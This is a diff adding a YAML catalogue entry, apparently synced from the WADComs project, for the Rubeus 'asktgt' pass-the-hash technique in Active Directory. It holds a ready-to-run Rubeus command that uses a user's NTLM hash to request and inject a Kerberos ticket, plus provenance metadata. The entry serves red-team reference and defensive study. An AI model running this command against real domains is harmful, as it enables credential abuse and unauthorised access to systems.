@@ -1,0 +1,77 @@
+id: wadcoms/Rubeus-AskTGT
+type: technique
+platform: active-directory
+name: Rubeus AskTGT
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- an NTLM hash (pass-the-hash)
+- a valid username
+commands:
+- template: Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+  comment: "Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order\
+    \ to access any service or machine where that user has permissions.\n\nCommand Reference:\n\n\tDomain:\
+    \ test.local\n\n\tUsername: john\n\n\tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n"
+references:
+- https://github.com/GhostPack/Rubeus
+- https://github.com/GhostPack/Rubeus#asktgt
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Rubeus-AskTGT.md
+      document: "---\ndescription: |\n  Rubeus' `asktgt` module uses a valid user's NTLM hash to request\
+        \ Kerberos tickets, in order to access any service or machine where that user has permissions.\n\
+        \n  Command Reference:\n\n  \tDomain: test.local\n\n  \tUsername: john\n\n  \tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n\
+        \ncommand: |\n  Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7\
+        \ /ptt\nitems:\n  - Hash\n  - Username\nservices:\n  - Kerberos\nOS:\n  - Windows\nattack_types:\n\
+        \  - Exploitation\nreferences:\n  - https://github.com/GhostPack/Rubeus\n  - https://github.com/GhostPack/Rubeus#asktgt\n\
+        ---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:1c6a2b8a8a9004e5677d0c3703921c4f8c0c92e1f16ec3bd99b0818867d46d27
